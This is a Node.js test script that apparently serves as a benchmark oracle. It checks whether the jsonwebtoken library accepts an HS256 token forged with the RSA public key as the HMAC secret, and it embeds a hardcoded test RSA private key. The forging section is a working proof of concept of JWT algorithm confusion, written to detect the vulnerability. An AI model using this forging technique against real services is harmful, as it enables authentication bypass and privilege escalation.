let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64urlJson(obj) {
  return Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  }));
}

try {
  const jwt = require('jsonwebtoken');

  const publicKey = [
    '-----BEGIN PUBLIC KEY-----',
    'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK9J2L2w0YqKqRR3YKHy+XapnwXCfJOL',
    'Aun1vDLteA94ppIqh+apMI2vlA38nSxrdbidKdvUSsfx8bVsgcuyoIwCAwEAAQ==',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  const privateKey = [
    '-----BEGIN RSA PRIVATE KEY-----',
    'MIIBOgIBAAJBAK9J2L2w0YqKqRR3YKHy+XapnwXCfJOLAun1vDLteA94ppIqh+ap',
    'MI2vlA38nSxrdbidKdvUSsfx8bVsgcuyoIwCAwEAAQJABH4m6q+UpBAkLTlaX2U4',
    'vdcGaVbL50DJBSSTXobHxPPH/FkOFjvFsRQAt2bQVWwtIg9Y9ycYzaO+VxDRKCVh',
    'wQIhANHtcwPa5RWPLXnwI75PwQxzb62LF8A3+yQUwpsOSJyVAiEAzBHQYaWV7k/y',
    'dUSHh3D1ynjUTduVdJN9WewtG/XAINMCIQCGM+dAf5BgU984wgKLF6ig84yYI6co',
    'dtYY4cYNSeNBYQIhAKhDOGOZa2mYIZHuZOKhHvJ3C0cFLbFhF38sZ4N2VNivAiEA',
    'l4Jt9V7H5PHeTtQKgHdwNwp0UrEGouGZWlznImPi0tM=',
    '-----END RSA PRIVATE KEY-----'
  ].join('\n');

  // Benign: RS256 sign/verify should work.
  const benignToken = jwt.sign({ sub: 'user123', role: 'user' }, privateKey, { algorithm: 'RS256' });
  const benignVerified = jwt.verify(benignToken, publicKey);
  if (!benignVerified || benignVerified.sub !== 'user123') {
    throw new Error('benign RS256 verify failed');
  }

  operation_completed = true;

  // Malicious: forge HS256 token using the RSA public key as HMAC secret.
  const forgedHeader = { alg: 'HS256', typ: 'JWT' };
  const forgedPayload = { sub: 'attacker', role: 'admin' };
  const forgedToken = jwt.sign(forgedPayload, publicKey, { algorithm: 'HS256', header: forgedHeader });

  try {
    const out = jwt.verify(forgedToken, publicKey);
    if (out && out.role === 'admin' && out.sub === 'attacker') {
      exploit_succeeded = true;
      evidence = 'forged HS256 token accepted with RSA public key material';
    } else {
      exploit_succeeded = false;
      evidence = 'forged token produced unexpected payload';
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'forged token rejected: ' + (e && e.message ? e.message : String(e));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
}

finish();